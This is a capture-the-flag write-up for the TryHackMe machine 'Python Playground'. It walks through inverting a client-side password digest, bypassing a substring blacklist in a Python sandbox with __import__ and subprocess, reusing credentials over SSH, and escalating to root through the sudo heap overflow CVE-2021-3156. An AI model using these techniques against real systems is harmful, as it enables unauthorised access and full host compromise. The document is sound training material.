## Introduction

_Python Playground_ is a hard-rated TryHackMe machine created by **deltatemporal** that explores client-side cryptanalysis, web application filter evasion, container isolation mechanics, and Linux privilege escalation. The target hosts a Node.js/Express web application providing a web-based Python execution environment with a self-proclaimed "foolproof" blacklist filter.

The exploitation journey spans three distinct phases across the container and host:

1. **Client-Side Backdoor Reversing:** Analyzing Connor's client-side login validation logic to invert a double base-26 letter-pair transformation and recover valid credentials.
2. **Sandbox Blacklist Escape:** Evading the substring filter via `__import__` to execute arbitrary commands as **root inside the Docker web container** (`flag1.txt`).
3. **Lateral Movement & Host Exploitation:** Reusing Connor's credentials over SSH against the Docker host (`flag2.txt`), followed by executing a pure-Python **Baron Samedit (CVE-2021-3156)** heap overflow against outdated `sudo` to achieve **full root compromise on the host** (`flag3.txt`).

## Initial Foothold

### Connor's Secret Admin Backdoor

`admin.html` is a login form titled **"Connor's Secret Admin Backdoor"**, and its comment set the tone for the entire room:

```js
// I suck at server side code, luckily I know how to make things secure without it - Connor
```

![Connor's Secret Admin Backdoor](https://i.imgur.com/MIN0Vu4.png)

The validation is **entirely client-side**. The username is compared against a literal, and the password is double-encoded before being checked against a hardcoded digest:

```js
function string_to_int_array(str) {
  const intArr = [];
  for (let i = 0; i < str.length; i++) {
    const charcode = str.charCodeAt(i);
    const partA = Math.floor(charcode / 26); // high digit
    const partB = charcode % 26; // low digit
    intArr.push(partA);
    intArr.push(partB);
  }
  return intArr;
}

function int_array_to_text(int_array) {
  let txt = "";
  for (let i = 0; i < int_array.length; i++) {
    txt += String.fromCharCode(97 + int_array[i]); // a..z alphabet
  }
  return txt;
}

// ...on submit:
if (document.getElementById("username").value !== "connor") {
  /* fail */
}

const hash = int_array_to_text(
  string_to_int_array(int_array_to_text(string_to_int_array(chosenPass))),
);

if (hash === "dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu") {
  window.location = "super-secret-admin-testing-panel.html";
}
```

### Inverting the Encoding

Each character becomes a **pair of lowercase letters** — one for `ord(c)//26`, one for `ord(c)%26`, both shifted into the `a..z` alphabet — and that transform is applied **twice**. Inverting it is just character subtraction:

```python
def letters_to_text(letters):
    nums = [ord(c) - 97 for c in letters]
    out = ""
    for i in range(0, len(nums), 2):
        out += chr(nums[i] * 26 + nums[i + 1])
    return out

digest = 'dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu'
print(letters_to_text(letters_to_text(digest)))
```

```
spaghetti1245
```

## Sandbox Escape

### Mapping the Filter

Fingerprinting which strings trip the filter shows that `import ` (with the trailing space), `eval`, and `exec` are banned — while `__import__` (no space) runs fine. We can read the exact filter source directly from the host by abusing the same sandbox with `__import__('subprocess')`:

```python
print(__import__('subprocess').getoutput('grep -A16 isAllowed index.js'))
```

```js
function isAllowed(code) {
  if (typeof code !== "string") {
    return false;
  }
  if (code.indexOf("import ") >= 0) {
    return false;
  }
  if (code.indexOf("eval") >= 0) {
    return false;
  }
  if (code.indexOf(".system") >= 0) {
    return false;
  }
  if (code.indexOf("exec") >= 0) {
    return false;
  }
  return true;
}
// ...the app writes the code to scripts/<random>.py and spawns 'python3 <name>'
```

The filter is a set of **substring checks** against the raw request body, so the bypass is literally encoded in its own gaps:

| Banned substring | Working equivalent          | Why it slips through             |
| ---------------- | --------------------------- | -------------------------------- |
| `import `        | `__import__(...)`           | `__import__` has no `import `    |
| `.system`        | `subprocess.getoutput(...)` | no `.system` substring anywhere  |
| `exec` / `eval`  | (not needed)                | `getoutput` already gives shells |

And note what the runner does with the code — it **writes the file itself** into the app directory before spawning `python3` on it:

```js
const name = `scripts/${Math.floor(Math.random() * 100000000000)}.py`;
fs.writeFileSync(name, code);
const python = spawn("python3", [name]);
```

## Privilege Escalation

### Washing Away sudo

connor can't leverage sudo at all — sudoers greps back empty for the user:

```
$ sudo -n -l
Sorry, user connor may not run sudo on pythonplayground.
```

No `docker` group membership either, so the classic socket isn't reachable:

```
srw-rw---- 1 root docker 0 /run/docker.sock
```

The host is running **Ubuntu 18.04** (kernel `4.15.0-99`) with a vulnerable sudo:

```
dpkg -l | grep ' sudo '
ii  sudo  1.8.21p2-3ubuntu1.2   Provide limited super user privileges
```

sudo **1.8.21p2** falls inside the affected range of **CVE-2021-3156 (_Baron Samedit_)** — a heap overflow in the argument-parsing code that any user can trigger via `sudoedit -s` **before authentication** is even attempted, no sudo rights of any kind required.

### Pure-Python Baron Samedit

The host has **no gcc**, so we drive the exploit with a pure-Python port of Sleepya's `service_user` overwrite technique (see `worawit/CVE-2021-3156`), delivered over SSH with paramiko. The exploit overflows sudo's heap, overwrites the NSS `service_user` struct so glibc loads **our** `libnss_X/X1234.so.2`, and that library spawns `system("/bin/sh")` as root:

```bash
cd /tmp && printf 'id; cat /root/flag3.txt\n' | timeout 90 python3 thm_pg_baron.py
```

## Summary

Python Playground is a demonstration of **what happens when every layer trusts a string**:

1. A **client-side login** published credentials inside an invertible base-26 digest — password never knew the server.
2. A **substring blacklist** guarding a Python runner fell to `__import__` because the blocked token included its own trailing space.
3. The python interpreter ran as **root** inside the container, opening the docker gateway and a host account with **password reuse**.
4. An **unpatched sudo (1.8.21p2)** on outdated Ubuntu left the whole host one heap overflow away from root, with no sudo membership needed by the attacker.
